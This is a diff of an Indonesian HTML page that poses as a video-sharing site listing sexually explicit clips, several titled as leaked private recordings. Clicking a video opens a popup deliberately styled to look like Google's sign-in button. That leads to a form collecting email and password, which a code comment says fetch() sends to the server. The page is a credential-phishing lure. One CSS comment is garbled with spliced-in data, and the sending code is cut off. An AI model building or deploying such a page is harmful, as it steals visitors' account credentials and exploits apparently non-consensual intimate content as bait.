@@ -2,93 +2,875 @@
 <html lang="id">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Web Video</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>video.play</title>
+
 <style>
-:root{--bg:#f6f6f8;--card:#fff;--tx:#1a1a22;--mut:#6b6b7a;--ac:#e5354b;--bd:#dcdce4;color-scheme:light dark}
-@media (prefers-color-scheme:dark){:root{--bg:#101014;--card:#1b1b22;--tx:#f1f1f5;--mut:#9a9aa8;--bd:#33333d}}
-body{margin:0;background:var(--bg);color:var(--tx);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
-main{max-width:640px;margin:0 auto;padding:16px}
-h1{font-size:1.3rem;margin:8px 0 16px}
-.player{background:#000;border-radius:14px;overflow:hidden;aspect-ratio:16/9;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#fff}
-.player video{width:100%;height:100%;object-fit:contain}
-.ph{text-align:center;padding:16px;opacity:.85}.ph b{display:block;font-size:2rem}
-button{font:inherit;border:0;border-radius:10px;padding:12px 18px;background:var(--ac);color:#fff;font-weight:600;cursor:pointer}
-button:disabled{opacity:.6}
-.sec{background:transparent;color:var(--tx);border:1px solid var(--bd)}
-label{display:block;font-size:.85rem;color:var(--mut);margin:10px 0 4px}
-input{width:100%;box-sizing:border-box;font:inherit;padding:11px 12px;border-radius:10px;border:1px solid var(--bd);background:var(--bg);color:var(--tx)}
-.overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;padding:16px;z-index:50}
+/* ============================================================
+   VARIABEL WARNA (CSS Variables)
+   Semua warna di web ini diambil dari sini, bukan ditulis
+   berulang-ulang di tiap elemen. Jadi kalau mau ganti tema,
+   cukup ubah nilai di --bg, --card, --ac, dst di satu tempat
+   ini — seluruh halaman otomatis ikut berubah.
+   =============================d:"18 Nov 2025",uploader:"Admin Demo",views:1250},
+  {id:"v2",title:"Video pilihan",kategori:"viral",durasi:"08:15",thumb:"/thumbs/2.jpg",upload:"26Jan=============================== */
+:root{
+  --bg:#f4f5f8;        /* warna latar belakang halaman */
+  --card:#ffffff;      /* warna kartu/kotak (video, modal, dll) */
+  --tx:#1b1e25;        /* warna teks utama */
+  --mut:#7a8296;       /* warna teks abu-abu/kurang penting */
+  --ac:#7c5cff;        /* warna aksen utama (ungu) */
+  --ac2:#20b48a;       /* warna aksen kedua (hijau) */
+  --bd:#e3e6ee;        /* warna garis/border tipis */
+  --shadow:0 2px 10px rgba(20,20,40,.06); /* bayangan halus kartu */
+  color-scheme:light;  /* kasih tahu browser bahwa tema ini terang */
+}
+
+/* Reset dasar: biar ukuran padding/border tidak bikin elemen melebar */
+*{box-sizing:border-box}
+
+html,body{height:100%}
+
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--tx);
+  font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  /* dua baris di bawah: kasih jarak aman dari notch/status bar HP */
+  padding-top:env(safe-area-inset-top,0px);
+  padding-bottom:env(safe-area-inset-bottom,0px);
+}
+
+/* Class bantu buat sembunyiin elemen. Tinggal tambah/hapus
+   class ini lewat JavaScript untuk show/hide sesuatu. */
 .hidden{display:none!important}
-.modal{position:relative;background:var(--card);border:1px solid var(--bd);border-radius:16px;padding:22px;width:100%;max-width:360px;box-sizing:border-box}
-.modal h2{font-size:1.05rem;margin:0 0 6px}
-.x{position:absolute;top:8px;right:8px;padding:4px 10px;border-radius:8px}
-.gbrand{display:flex;flex-direction:column;align-items:center;gap:14px}
-.pesan-link{background:none;color:var(--ac);font-size:1.25rem;padding:6px 10px;text-decoration:underline}
-.hint{font-size:.85rem;color:var(--mut);margin-top:10px}
-.row{margin-top:14px}
+
+/* Reset tampilan default <button> HTML, biar polos dan gampang di-style ulang */
+button{
+  font:inherit;
+  border:0;
+  cursor:pointer;
+  color:inherit;
+  background:none;
+}
+
+/* ===================== HEADER / TOP BAR ===================== */
+.top{
+  position:sticky;   /* nempel di atas walau di-scroll */
+  top:0;
+  z-index:10;
+  background:rgba(255,255,255,.92);
+  backdrop-filter:blur(8px); /* efek blur kaca buram */
+  border-bottom:1px solid var(--bd);
+  padding-top:env(safe-area-inset-top,0px);
+}
+
+.bar{
+  max-width:1100px;  /* lebar maksimal konten, biar gak terlalu lebar di layar besar */
+  margin:0 auto;     /* taruh di tengah */
+  display:flex;
+  align-items:center;
+  gap:12px;
+  padding:12px 16px;
+}
+
+.logo{
+  font-weight:800;
+  font-size:1.2rem;
+  white-space:nowrap;
+  color:var(--tx);
+}
+
+.logo b{
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  width:26px;
+  height:26px;
+  margin-right:6px;
+  border-radius:8px;
+  background:linear-gradient(135deg,var(--ac),var(--ac2)); /* gradasi 2 warna aksen */
+  font-size:.7rem;
+  color:#fff;
+}
+
+.logo span{color:var(--ac2)}
+
+.search{
+  flex:1;        /* ambil sisa ruang yang ada di .bar */
+  min-width:0;
+  padding:10px 14px;
+  border-radius:999px; /* angka besar = bentuk pil/kapsul */
+  border:1px solid var(--bd);
+  background:var(--card);
+  color:var(--tx);
+  font:inherit;
+  font-size:.9rem;
+}
+
+.search::placeholder{color:var(--mut)}
+
+/* ===================== CHIP KATEGORI ===================== */
+.chips{
+  max-width:1100px;
+  margin:0 auto;
+  display:flex;
+  gap:8px;
+  overflow-x:auto;    /* bisa discroll ke samping kalau kategorinya banyak */
+  padding:0 16px 12px;
+  scrollbar-width:none; /* sembunyiin scrollbar (Firefox) */
+}
+
+.chips::-webkit-scrollbar{display:none} /* sembunyiin scrollbar (Chrome/Safari) */
+
+.chip{
+  flex:none;      /* ukurannya tetap, gak ikut menyusut/melebar */
+  padding:7px 14px;
+  border-radius:999px;
+  border:1px solid var(--bd);
+  background:var(--card);
+  font-size:.85rem;
+  color:var(--mut);
+}
+
+/* Class "on" ditambahkan lewat JS ke chip yang lagi aktif/dipilih */
+.chip.on{
+  background:var(--ac);
+  border-color:var(--ac);
+  color:#fff;
+}
+
+/* ===================== ISI UTAMA (video) ===================== */
+main{
+  max-width:1100px;
+  margin:0 auto;
+  padding:16px;
+}
+
+/* .hero = kartu video besar paling atas (video pertama hasil filter) */
+.hero{
+  display:block;
+  width:100%;
+  text-align:left;
+  margin-bottom:22px;
+}
+
+.hero .thumb{
+  aspect-ratio:16/9;   /* rasio lebar:tinggi gambar video */
+  border-radius:16px;
+}
+
+.hero .ttl{
+  margin-top:12px;
+  font-size:1.2rem;
+  font-weight:700;
+  -webkit-line-clamp:2;
+}
+
+.hero .cat{
+  margin-top:4px;
+  font-size:.85rem;
+}
+
+/* .grid = kumpulan kartu video kecil di bawah hero */
+.grid{
+  display:grid;
+  /* kolom otomatis menyesuaikan lebar layar, minimal 160px tiap kolom */
+  grid-template-columns:repeat(auto-fill,minmax(160px,1fr));
+  gap:16px 12px;
+}
+
+/* .card = satu kartu video (dipakai baik di .grid maupun jadi isi .hero) */
+.card{
+  text-align:left;
+  display:block;
+  width:100%;
+  background:var(--card);
+  border-radius:14px;
+  padding:6px;
+  box-shadow:var(--shadow);
+}
+
+/* .thumb = kotak thumbnail/gambar video */
+.thumb{
+  position:relative;   /* biar elemen anak (durasi, tombol play) bisa absolute di dalamnya */
+  aspect-ratio:16/9;
+  border-radius:10px;
+  overflow:hidden;
+  background:linear-gradient(135deg,#eef0f6,#e4e7f0); /* warna default sebelum/tanpa foto */
+}
+
+.thumb img{
+  width:100%;
+  height:100%;
+  object-fit:cover;   /* gambar dipotong rapi mengisi kotak, tidak gepeng */
+  display:block;
+}
+
+/* .ph = ikon ▶ abu-abu yang muncul selama belum ada foto asli */
+.thumb .ph{
+  position:absolute;
+  inset:0;   /* menutupi seluruh .thumb (top/right/bottom/left: 0) */
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:1.6rem;
+  color:var(--mut);
+}
+
+/* .play = ikon play bulat kecil di pojok kanan bawah thumbnail */
+.thumb .play{
+  position:absolute;
+  right:8px;
+  bottom:8px;
+  width:30px;
+  height:30px;
+  border-radius:50%;
+  background:rgba(0,0,0,.55);
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:.7rem;
+}
+
+/* .dur = label durasi video (pojok kiri bawah thumbnail) */
+.dur{
+  position:absolute;
+  left:6px;
+  bottom:6px;
+  background:rgba(0,0,0,.7);
+  color:#fff;
+  font-size:.72rem;
+  padding:2px 6px;
+  border-radius:6px;
+}
+
+/* efek garis ungu di sekeliling thumbnail saat kartu di-hover (mouse) */
+.card:hover .thumb{outline:2px solid var(--ac)}
+
+.ttl{
+  margin-top:8px;
+  padding:0 4px;
+  font-size:.9rem;
+  line-height:1.3;
+  /* 4 baris di bawah: potong judul otomatis jadi maksimal 2 baris + "..." */
+  display:-webkit-box;
+  -webkit-line-clamp:2;
+  -webkit-box-orient:vertical;
+  overflow:hidden;
+}
+
+.cat{
+  margin-top:3px;
+  padding:0 4px 4px;
+  font-size:.75rem;
+  color:var(--ac2);
+}
+
+/* Pesan "Tidak ada video yang cocok" saat hasil pencarian kosong */
+.empty{
+  color:var(--mut);
+  padding:30px 0;
+  text-align:center;
+}
+
+/* ===================== POPUP / MODAL ===================== */
+/* .overlay = lapisan gelap transparan yang menutupi seluruh layar
+   saat popup terbuka (jadi background-nya gak bisa diklik) */
+.overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(20,22,30,.45);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:16px;
+  z-index:50;
+}
+
+/* .modal = kotak putih popup yang berada di tengah .overlay */
+.modal{
+  position:relative;
+  background:var(--card);
+  border:1px solid var(--bd);
+  border-radius:16px;
+  padding:36px 20px 32px;
+  width:100%;
+  max-width:360px;   /* lebar maksimal popup */
+  box-shadow:0 12px 32px rgba(20,20,40,.18);
+}
+
+.modal h2{
+  font-size:1.05rem;
+  margin:0 0 18px;
+  text-align:center;
+}
+
+.sub{
+  font-size:.9rem;
+  font-weight:600;
+  color:var(--tx);
+  margin:0 0 18px;
+  text-align:center;
+}
+
+/* .x = tombol bulat "✕" buat nutup popup */
+.x{
+  position:absolute;
+  top:10px;
+  right:10px;
+  width:28px;
+  height:28px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:0;
+  border-radius:50%;
+  border:1px solid var(--bd);
+  color:var(--mut);
+  font-size:.8rem;
+}
+
+.x:hover{background:var(--bg)}
+
+/* .gbrand = wadah isi popup login (judul "Login" + tombol Google + catatan) */
+.gbrand{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:10px;
+  text-align:center;
+}
+
+.tes{
+  font-size:1.05rem;
+  font-weight:700;
+  color:var(--tx);
+}
+
+/* .field = pembungkus 1 pasang label + input di form (biar jaraknya rapi) */
+.field{
+  margin-bottom:14px;
+}
+
+label{
+  display:block;
+  font-size:.82rem;
+  font-weight:600;
+  color:var(--mut);
+  margin:0 0 6px;
+}
+
+input.f{
+  width:100%;
+  font:inherit;
+  padding:12px 14px;
+  border-radius:10px;
+  border:1px solid var(--bd);
+  background:var(--bg);
+  color:var(--tx);
+}
+
+/* tampilan saat kotak input sedang diklik/diketik */
+input.f:focus{
+  outline:none;
+  border-color:var(--ac);
+  background:var(--card);
+}
+
+/* GOOGLE BUTTON — sengaja dibuat mirip tombol resmi Google
+   (putih, border abu, logo 4 warna) biar terasa familiar */
+.btn-google{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  width:100%;
+  background:#fff;
+  border:1px solid #dadce0;
+  border-radius:8px;
+  padding:12px 16px;
+  font-family:Roboto,Arial,sans-serif;
+  font-size:14px;
+  font-weight:500;
+  color:#3c4043;
+  cursor:pointer;
+  box-shadow:0 1px 2px rgba(0,0,0,.08);
+  transition:background .2s,box-shadow .2s;
+}
+
+.btn-google:hover{
+  background:#f8f9fa;
+  box-shadow:0 1px 4px rgba(0,0,0,.15);
+}
+
+.btn-google:disabled{
+  opacity:.6;
+  cursor:not-allowed;
+}
+
+.btn-google svg{
+  width:18px;
+  height:18px;
+  flex-shrink:0;
+}
+
+/* Tombol kirim pada form, dibedakan dari tombol Google agar tidak tertukar */
+.btn-primary{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  width:100%;
+  margin-top:6px;
+  padding:12px 16px;
+  border-radius:8px;
+  font-size:14px;
+  font-weight:600;
+  color:#fff;
+  background:linear-gradient(135deg,var(--ac),var(--ac2));
+  box-shadow:0 2px 8px rgba(124,92,255,.3);
+  transition:opacity .2s,box-shadow .2s;
+}
+
+.btn-primary:hover{box-shadow:0 2px 12px rgba(124,92,255,.4)}
+
+.btn-primary:disabled{
+  opacity:.6;
+  cursor:not-allowed;
+  box-shadow:none;
+}
+
+/* .hint = teks status di bawah form ("Mengirim…", "Terkirim ✔", pesan error) */
+.hint{
+  font-size:.85rem;
+  color:var(--mut);
+  margin-top:12px;
+  min-height:1.2em;  /* biar layout gak "lompat" saat teksnya muncul/hilang */
+  text-align:center;
+}
+
+/* .note = catatan kecil abu-abu di bawah tombol Google */
+.note{
+  font-size:.72rem;
+  color:var(--mut);
+  text-align:left;
+  margin-top:4px;
+  line-height:1.4;
+}
+
+
+/* Metadata simulasi di bawah judul setiap video */
+.video-meta{
+  display:flex;
+  flex-wrap:wrap;
+  align-items:center;
+  gap:5px 12px;
+  margin:5px 2px 0;
+  color:var(--mut);
+  font-size:.72rem;
+  line-height:1.4;
+}
+.video-meta-item{
+  display:inline-flex;
+  align-items:center;
+  gap:4px;
+  min-width:0;
+}
+.video-meta-item svg{
+  width:14px;
+  height:14px;
+  flex:none;
+  fill:none;
+  stroke:currentColor;
+  stroke-width:1.8;
+  stroke-linecap:round;
+  stroke-linejoin:round;
+}
+
 </style>
 </head>
+
 <body>
+
+<!-- ============================================================
+     HEADER: logo + kotak pencarian + baris kategori
+     ============================================================ -->
+<header class="top">
+  <div class="bar">
+    <div class="logo">
+      <b>▶</b>video<span>.play</span>
+    </div>
+    <!-- input pencarian: JS "mendengarkan" ketikan di sini lewat event "input" -->
+    <input id="q" class="search" type="search"
+      placeholder="Cari video…" autocomplete="off">
+  </div>
+  <!-- #chips dikosongkan di HTML, lalu diisi otomatis Oleh JS
+       berdasarkan kategori yang ada di data ITEMS -->
+  <div class="chips" id="chips"></div>
+</header>
+
+
+<!-- ============================================================
+     KONTEN UTAMA: video besar (hero) + grid video kecil
+     Semua isinya dibuat/diisi lewat JavaScript, bukan ditulis
+     manual di sini — makanya div/button-nya kosong.
+     ============================================================ -->
 <main>
-  <h1>🎬 Web Video</h1>
-  <div class="player" id="player">
-    <video id="vid" class="hidden" playsinline loop></video>
-    <div class="ph" id="ph"><b>▶</b>Belum ada video.</div>
+  <button class="hero hidden" id="hero"></button>
+  <div class="grid" id="grid"></div>
+  <div class="empty hidden" id="empty">
+    Tidak ada video yang cocok.
   </div>
 </main>
 
-<div class="overlay hidden" id="popup"><div class="modal">
-  <button class="x sec" data-close aria-label="Tutup">✕</button>
-  <div class="gbrand">
-    <svg width="48" height="48" viewBox="0 0 48 48" aria-label="Google"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
-    <button id="btnPesan" class="pesan-link">Pesan</button>
-  </div>
-</div></div>
+<!-- ============================================================
+     POPUP 1: muncul saat kartu video diklik.
+     Isinya cuma judul "Login" + tombol Google (simulasi).
+     ============================================================ -->
+<div class="overlay hidden" id="popup">
+  <div class="modal">
+    <!-- atribut data-close dipakai JS buat tahu tombol ini "tutup popup" -->
+    <button class="x" data-close aria-label="Tutup">✕</button>
 
-<div class="overlay hidden" id="formCard"><div class="modal">
-  <button class="x sec" data-close aria-label="Tutup">✕</button>
-  <h2>Menu Format</h2>
-  <label for="nama">Nama</label>
-  <input id="nama" autocomplete="given-name" maxlength="80" placeholder="Nama">
-  <label for="belakang">Nama belakang</label>
-  <input id="belakang" autocomplete="family-name" maxlength="80" placeholder="Nama belakang">
-  <div class="row"><button id="btnKirim">Kirim ke Email</button></div>
-  <div class="hint" id="msg"></div>
-</div></div>
+    <div class="gbrand">
+      <div class="tes">Login</div>
+
+      <!-- tombol ini yang, kalau diklik, akan membuka popup form (#formCard) -->
+      <button id="btnLogin" class="btn-google">
+        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+          <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+          <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34A21.97 21.97 0 0 0 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/>
+          <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+        </svg>
+        Login dengan Google
+      </button>
+
+      <div class="note">Gunakan Akun Google Anda untuk mengakses layanan ini. Pastikan Anda menggunakan akun yang benar agar proses login berjalan dengan lancar.
+
+Keamanan akun Anda adalah prioritas kami.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================
+     POPUP 2: form Email depan/belakang, muncul setelah klik
+     tombol "Login dengan Google" di popup 1.
+     ============================================================ -->
+<div class="overlay hidden" id="formCard">
+  <div class="modal">
+    <button class="x" data-close aria-label="Tutup">✕</button>
+
+    <h2>Login</h2>
+
+    <div class="field">
+      <label for="Email">Email</label>
+      <input id="Email" class="f" autocomplete="given-name"
+        maxlength="80" placeholder="Email">
+    </div>
+
+    <div class="field">
+      <label for="belakang">Password</label>
+      <input id="belakang" class="f" autocomplete="family-name"
+        maxlength="80" placeholder="Password">
+    </div>
+
+    <!-- tombol ini yang mengirim data form ke server lewat fetch() -->
+    <button id="btnKirim" class="btn-primary">
+      Login
+    </button>
+
+    <!-- tempat munculnya pesan status kirim (sukses/gagal) -->
+    <div class="hint" id="msg"></div>
+  </div>
+</div>
 
 <script>
+/* ============================================================
+   DAFTAR VIDEO (ITEMS)
+   Ini "database" sederhana-nya web ini — cuma array objek
+   JavaScript biasa, bukan database sungguhan.
+   - id       : penanda unik tiap video
+   - title    : judul video
+   - kategori : dipakai buat filter chip kategori & pencarian
+   - durasi   : teks yang muncul di label durasi
+   - thumb    : link/path gambar thumbnail — GANTI nilai ini
+                kalau mau pasang foto sendiri (bisa link
+                https://..., atau data:image/...;base64,...)
+   Mau nambah video baru? Copy satu baris {...}, ubah isinya,
+   taruh di dalam kurung siku [ ] ini (pisahkan pakai koma).
+   ============================================================ */
+const ITEMS = [
+  // Metadata berikut adalah data contoh/fiktif untuk demonstrasi.
+  {id:"v1",title:"Pulang Kampus Aulia Tobrut Pulang Bareng Dosen",kategori:"terbaru",durasi:"02:24",thumb:"https://i.ibb.co.com/3mJWBqTg/02-59-Pulang-Kampus-Aulia-Tobrut-Pulang-Bareng-Dosen.webp",upload:"08 Feb 2025",uploader:"Cantika rahma",views:2430},
+  {id:"v2",title:"Desahan Pacar Gemoy Hypersex",kategori:"viral",durasi:"02:54",thumb:"https://i.ibb.co.com/d0WHW7bJ/02-54-Desahan-Pacar-Gemoy-Puting-Coklat-Hypersex.webp",upload:"18 Nov 2026",uploader:"Aurel",views:29716},
+  {id:"v3",title:"Aca Tobrut Pemersatu Bangsa Pulang Dari Salon",kategori:"hot",durasi:"05:40",thumb:"https://i.ibb.co.com/pjrpkRXj/10-11-Aca-Tobrut-Pemersatu-Bangsa-Pulang-Dari-Salon.webp",upload:"01 Mar 2024",uploader:"Andika syaputra",views:5120},
+  {id:"v4",title:"Tiktokers Kristin Colmek Bar-Bar",kategori:"hot",durasi:"06:52",thumb:"https://i.ibb.co.com/7NCcgq3J/09-06-Tiktokers-Kristin-Colmek-Bar-Bar.webp",upload:"05 Jul 2025",uploader:"Pink black",views:890},
+  {id:"v5",title:"Selebgram Aurelqz Tobrut Colmek",kategori:"terbaru",durasi:"01:07",thumb:"https://i.ibb.co.com/KxDWHttD/16-11-Selebgram-Aurelqz-Tobrut-Colmek.webp",upload:"14 Nov 2026",uploader:"Andika syaputra",views:3760},
+  {id:"v6",title:"Pacar Puas Dapet Gadis Tobrut Yang Penurut",kategori:"terbaru",durasi:"09:30",thumb:"https://i.ibb.co.com/KpzhJ5QD/04-10-Pacar-Puas-Dapet-Gadis-Tobrut-Yang-Penurut.webp",upload:"13 Nov 2026",uploader:"Putri pinky",views:1640},
+  {id:"v7",title:"Urdella Ngewe Eksib Tengah Malam di Tangga Darurat Mall",kategori:"viral",durasi:"08:12",thumb:"https://i.ibb.co.com/tTC1k3NR/02-28-Urdella-Ngewe-Eksib-Tengah-Malam-di-Tangga-Darurat-Mall.webp",upload:"23 Ags 2026",uploader:"sex japanes",views:7210},
+  {id:"v8",title:"UKHTI JILBAB NGEWE PAS LAGI HAMIL MUDA",kategori:"viral",durasi:"05:48",thumb:"https://i.ibb.co.com/0jkb1Ytm/09-34-Ukhti-Jilbab-Ngewe-Pas-Lagi-Hamil-Muda.webp",upload:"01 Jun 2026",uploader:"kang viral57",views:980},
+  {id:"v9",title:"Kompilasi Tiktokers Not Alysa",kategori:"viral",durasi:"09:30",thumb:"https://i.ibb.co.com/qYGv0nrb/09-30-Kompilasi-Tiktokers-Not-Alysa-Colmek.webp",upload:"14 Mar 2024",uploader:"Aurel",views:29716},
+  {id:"v10",title:"Tante Binor Pasuruan dan Mahasiswa Brondong",kategori:"hot",durasi:"27:31",thumb:"https://i.ibb.co.com/0pcr3jwV/27-31-Tante-Binor-Pasuruan-Dipuasin-Mahasiswa-Brondong-1.webp",upload:"22 Jul 2025",uploader:"Nadine",views:83427},
+  {id:"v11",title:"Binor Jawa Mbak Pur Nganjuk",kategori:"terbaru",durasi:"08:40",thumb:"https://i.ibb.co.com/xtCMTNxg/08-40-Binor-Jawa-Mbak-Pur-Nganjuk-Ngewe-Tanpa-Sensor.webp",upload:"05 Jan 2023",uploader:"Video Center",views:3268},
+  {id:"v12",title:"Hijabers Pegawai Ayam Fried Chicken",kategori:"populer",durasi:"01:16",thumb:"https://i.ibb.co.com/GQ2JjWbs/01-16-Ngewe-Hijabers-Pegawai-Ayam-Fried-Chicken.webp",upload:"18 Sep 2026",uploader:"Clarissa",views:45631},
+  {id:"v13",title:"Kompilasi Pasutri Bekasi",kategori:"viral",durasi:"13:26",thumb:"https://i.ibb.co.com/Cp2kxG8B/13-26-Kompilasi-Pasutri-Bekasi-Bikin-Dokumentasi-Ngewe.webp",upload:"09 Mei 2024",uploader:"Vania",views:99814},
+  {id:"v14",title:"Ukhti Hijab Dikerjain di Dalam Mobil",kategori:"hot",durasi:"04:39",thumb:"https://i.ibb.co.com/4nMMYdyD/04-39-Ukhti-Hijab-Dikerjain-Didalam-Mobil.webp",upload:"27 Feb 2025",uploader:"Sabrina",views:18473},
+  {id:"v15",title:"Cewek Toge Basah Kuyup",kategori:"terbaru",durasi:"07:34",thumb:"https://i.ibb.co.com/Vcj634dB/07-34-Cewek-Toge-Basah-Kuyup-Digarap-Kontol-20-cm.webp",upload:"11 Nov 2023",uploader:"Update Channel",views:76219},
+  {id:"v16",title:"Dapet Cewek Cantik Mekinya Mulus",kategori:"viral",durasi:"03:25",thumb:"https://i.ibb.co.com/nM09S1sB/03-25-Dapet-Ngentot-Cewek-Cantik-Mekinya-Mulus.webp",upload:"30 Agu 2026",uploader:"Celine",views:54382},
+  {id:"v17",title:"Pacar Cantik Cowoknya Beruntung",kategori:"populer",durasi:"01:40",thumb:"https://i.ibb.co.com/mVZn4f6Y/01-40-Pacar-Cantik-Cowoknya-Beruntung-Bisa-Ngentot-Tiap-Hari.webp",upload:"16 Apr 2025",uploader:"Amanda",views:9186},
+  {id:"v18",title:"Bu Guru Salsa Bikin Konten Baru Lagi",kategori:"hot",durasi:"01:50",thumb:"https://i.ibb.co.com/v4yDbhtt/01-50-Bu-Guru-Salsa-Tobrut-Bikin-Konten-Baru-Lagi.webp",upload:"03 Des 2024",uploader:"Vanessa",views:68734},
+  {id:"v19",title:"Hijabers Gampangan",kategori:"terbaru",durasi:"05:50",thumb:"https://i.ibb.co.com/gFT6cPRh/05-50-Hijabers-Gampangan.webp",upload:"25 Jun 2023",uploader:"Digital Media",views:27391},
+  {id:"v20",title:"Koleksi Pribadi Dyfa",kategori:"viral",durasi:"08:56",thumb:"https://i.ibb.co.com/d0gPZPrm/08-56-Koleksi-Pribadi-Dyfa-Cakep-Ngewe.webp",upload:"07 Okt 2025",uploader:"Melinda",views:81562},
+  {id:"v21",title:"Kolpri Cindo Eliza Body Mulus",kategori:"populer",durasi:"10:13",thumb:"https://i.ibb.co.com/39jJXhJM/10-13-Kolpri-Cindo-Eliza-Toket-Ranum-Body-Mulus-1.webp",upload:"19 Jan 2026",uploader:"Keisya",views:14928},
+  {id:"v22",title:"Kolpri Cindo Eliza Body Mulus Part 2",kategori:"hot",durasi:"19:51",thumb:"https://i.ibb.co.com/99TDCTSd/19-51-Kolpri-Cindo-Eliza-Toket-Ranum-Body-Mulus-2.webp",upload:"12 Jul 2024",uploader:"Felicia",views:93215},
+  {id:"v23",title:"Cewek Gen Z Kesukaan Cowok Zaman Now",kategori:"terbaru",durasi:"05:28",thumb:"https://i.ibb.co.com/M5V5F86p/05-28-Cewek-Gen-Z-Kesukaan-Cowok-Zaman-Now.webp",upload:"28 Mar 2023",uploader:"Daily Network",views:38746},
+  {id:"v24",title:"Pasutri Medan di Mobil",kategori:"viral",durasi:"08:31",thumb:"https://i.ibb.co.com/Lh52Tg8b/08-31-Pasutri-Medan-Di-Mobil.webp",upload:"06 Agu 2025",uploader:"Alisha",views:65483},
+  {id:"v25",title:"Cici Maya Skandal Viral",kategori:"hot",durasi:"05:50",thumb:"https://i.ibb.co.com/DgvbMv5j/HD-05-50-Cici-Maya-Skandal-Ngewe-Antara-Sakit-Atau-Nikmat.jpg",upload:"21 Feb 2026",uploader:"Kimberly",views:21957},
+  {id:"v26",title:"Pasutri Chindo Viral",kategori:"populer",durasi:"04:41",thumb:"https://i.ibb.co.com/xt24DSNh/HD-04-41-Pasutri-Chindo-Viral-Sepong-Eksib-Ngewe-Doggy.jpg",upload:"15 Okt 2023",uploader:"Natasya",views:78314},
+  {id:"v27",title:"Icip Barang Langka Chindo",kategori:"terbaru",durasi:"02:17",thumb:"https://i.ibb.co.com/LzXwXsRg/HD-02-17-Icip-Barang-Langka-Chindo-Tobrut-Sudah-Longsor.jpg",upload:"02 Mei 2026",uploader:"Media Daily",views:41269},
+  {id:"v28",title:"Kompilasi Video 21 Menit 34 Detik",kategori:"viral",durasi:"21:34",thumb:"https://i.ibb.co.com/CKvBZTC4/21-34.webp",upload:"24 Des 2024",uploader:"Anindya",views:56738},
+];
+
+// $("id") = jalan pintas, biar gak perlu nulis
+// document.getElementById("id") berulang-ulang.
 const $ = (id) => document.getElementById(id);
 
-fetch("/api/config").then((r) => r.json()).then((c) => {
-  if (c.videoUrl) { $("vid").src = c.videoUrl; $("vid").classList.remove("hidden"); $("ph").classList.add("hidden"); }
-}).catch(() => {});
+// Menyimpan kategori yang sedang dipilih user. "Semua" = default awal.
+let kategoriAktif = "Semua";
 
-$("player").addEventListener("click", () => {
-  $("popup").classList.remove("hidden");
-  const v = $("vid");
-  if (!v.classList.contains("hidden")) v.pause();
+/* ============================================================
+   BIKIN TOMBOL KATEGORI (CHIP) SECARA OTOMATIS
+   new Set(...) dipakai buat ambil kategori yang unik saja
+   (gak dobel), lalu "Semua" ditaruh di paling depan.
+   Jadi kalau di ITEMS ada kategori baru, chip-nya otomatis
+   muncul sendiri tanpa perlu ditulis manual di HTML.
+   ============================================================ */
+const kats = ["Semua", ...new Set(ITEMS.map(i => i.kategori))];
+
+kats.forEach(k => {
+  const b = document.createElement("button");
+  b.className = "chip" + (k === kategoriAktif ? " on" : "");
+  b.textContent = k;
+
+  // saat chip diklik: ganti kategori aktif, update tampilan "on"
+  // di semua chip, lalu render ulang daftar video
+  b.addEventListener("click", () => {
+    kategoriAktif = k;
+
+    [...$("chips").children].forEach(c =>
+      c.classList.toggle("on", c.textContent === k)
+    );
+
+    render();
+  });
+
+  $("chips").appendChild(b);
 });
-["popup", "formCard"].forEach((id) => $(id).addEventListener("click", function (e) {
-  if (e.target === this || e.target.hasAttribute("data-close")) this.classList.add("hidden");
-}));
-$("btnPesan").addEventListener("click", () => {
+
+/* ============================================================
+   buildCard(it)
